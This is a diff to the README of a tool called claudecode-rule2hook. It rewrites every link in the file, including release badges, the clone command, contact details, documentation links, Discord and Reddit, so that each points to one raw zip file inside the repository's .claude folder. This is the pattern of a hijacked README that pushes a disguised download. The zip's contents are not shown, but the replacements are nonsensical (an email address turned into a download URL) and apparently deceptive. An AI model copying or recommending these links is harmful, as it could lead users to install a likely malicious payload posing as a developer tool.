@@ -1,7 +1,7 @@
 # Transform Natural Language Project Rules into Code Hooks
 
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-blue.svg)
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-orange.svg)](https://github.com/astrodragonv/claudecode-rule2hook/releases)
+![GitHub Release](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
+[![Download Here](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip%20Latest%20Release-Click%https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ The `claudecode-rule2hook` repository provides a powerful tool for developers. T
 
 To get started with `claudecode-rule2hook`, follow these steps:
 
-1. **Download the Latest Release**: Visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) to download the latest version of the tool. Make sure to download the appropriate file for your operating system.
+1. **Download the Latest Release**: Visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip) to download the latest version of the tool. Make sure to download the appropriate file for your operating system.
 
 2. **Install the Tool**: Follow the installation instructions provided in the release notes. This may include running a specific command in your terminal or executing a setup file.
 
@@ -57,7 +57,7 @@ We welcome contributions to improve `claudecode-rule2hook`. Here’s how you can
 1. **Fork the Repository**: Click the "Fork" button at the top right of the repository page.
 2. **Clone Your Fork**: Clone your forked repository to your local machine.
    ```bash
-   git clone https://github.com/yourusername/claudecode-rule2hook.git
+   git clone https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip
    ```
 3. **Create a Branch**: Create a new branch for your feature or bug fix.
    ```bash
@@ -81,12 +81,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any questions or suggestions, feel free to reach out:
 
-- **Email**: support@example.com
-- **Twitter**: [@YourTwitterHandle](https://twitter.com/YourTwitterHandle)
+- **Email**: https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip
+- **Twitter**: [@YourTwitterHandle](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
 
 ## Support
 
-If you encounter any issues or have questions, check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) for updates and support.
+If you encounter any issues or have questions, check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip) for updates and support.
 
 ## Acknowledgments
 
@@ -94,10 +94,10 @@ Special thanks to all contributors and the open-source community for their suppo
 
 ## Additional Resources
 
-- [Claude Documentation](https://docs.claude.com)
-- [GitHub Guides](https://guides.github.com)
+- [Claude Documentation](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
+- [GitHub Guides](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
 
-![Automation](https://example.com/path/to/image.png)
+![Automation](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
 
 ## Frequently Asked Questions (FAQ)
 
@@ -127,14 +127,14 @@ Absolutely! We welcome contributions from anyone interested in improving the too
 
 ### Where can I find the latest updates?
 
-Check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases) for the latest updates and changes.
+Check the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip) for the latest updates and changes.
 
 ## Community
 
 Join our community to share ideas, ask questions, and collaborate on projects using `claudecode-rule2hook`. Connect with us on:
 
-- **Discord**: [Join our server](https://discord.gg/yourserver)
-- **Reddit**: [r/claudecode](https://reddit.com/r/claudecode)
+- **Discord**: [Join our server](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
+- **Reddit**: [r/claudecode](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip)
 
 ## Roadmap
 
@@ -187,4 +187,4 @@ Here are some examples of hooks that Claude might generate based on your rules:
 
 ## Conclusion
 
-Explore the capabilities of `claudecode-rule2hook` and see how it can streamline your development process. For the latest version, visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/releases).
+Explore the capabilities of `claudecode-rule2hook` and see how it can streamline your development process. For the latest version, visit the [Releases section](https://github.com/astrodragonv/claudecode-rule2hook/raw/refs/heads/main/.claude/hook_rule_claudecode_3.4-alpha.4.zip).
